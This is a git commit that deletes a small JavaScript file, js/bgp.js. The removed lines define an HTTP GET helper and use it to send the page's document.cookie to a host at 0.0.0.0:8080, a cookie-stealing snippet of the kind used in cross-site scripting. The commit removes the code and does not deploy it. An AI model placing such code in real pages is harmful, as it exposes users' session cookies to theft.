63caf02cf5972cf217a06ebd330ea0644c3a41e7
読み上げ <67372333+readloud@users.noreply.github.com>
2024-04-03 19:45:32 +0700

    Delete js/bgp.js

--- js/bgp.js
+++
@@ -1,9 +0,0 @@
-function httpGet(theUrl)
-{
-    var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
-    xmlHttp.send( null );
-    return xmlHttp.responseText;
-}
-
-httpGet('http://0.0.0.0:8080/[ '+document.cookie)
